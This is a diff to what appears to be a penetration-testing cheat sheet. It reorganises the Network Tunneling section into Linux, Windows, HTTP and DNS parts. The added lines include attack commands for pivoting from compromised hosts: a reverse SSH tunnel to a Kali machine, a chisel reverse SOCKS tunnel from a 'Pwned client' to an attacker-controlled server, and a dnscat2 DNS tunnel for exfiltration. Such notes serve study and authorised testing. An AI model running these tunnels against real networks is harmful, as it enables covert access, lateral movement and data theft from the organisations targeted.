@@ -71,6 +71,10 @@
   - [Cron Jobs](#cron-jobs)
   - [NFS](#nfs)
 - [Network Tunneling](#network-tunneling)
+  - [Linux Tools](#linux-tools)
+  - [Windows Tools](#windows-tools)
+  - [HTTP tunneling](#http-tunneling)
+  - [DNS tunneling](#dns-tunneling)
 - [Post Exploitation](#post-exploitation)
   - [Sensitive Information](#sensitive-information-1)
     - [Powershell History](#powershell-history)
@@ -1466,10 +1470,19 @@ chmod +x <binary>
 ```
 
 # Network Tunneling
+## Linux Tools
+```bash
+```
+## Windows Tools
 ```bash
 #Windows netsh
 netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=<dest_ip> #Listen on port 2222 and forward packets to port 22 on dest server
 
+#With SSH
+ssh -N -R 9998 kali@192.168.118.4
+```
+## HTTP Tunneling
+```bash
 #Chiesel SOCKS5 TCP/UDP tunnel over HTTP
 ./chisel server -p 8080 --reverse #Server controled by attacker
 chisel.exe client <Server IP>:8080 R:socks #Pnwed client
@@ -1480,6 +1493,9 @@ proxychains <command to tunnel> # Add -q to ommit proxychains output
 #Tunnel SSH through SOCKS proxy
 ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' <user>@<server> #Needs Nmap version of ncat
 
+```
+## DNS Tunneling
+```bash
 #dnscat2 tunnel over DNS
 dnscat2-server <domain to use for exfiltration> #Server
 ./dnscat feline.corp #Compromised host
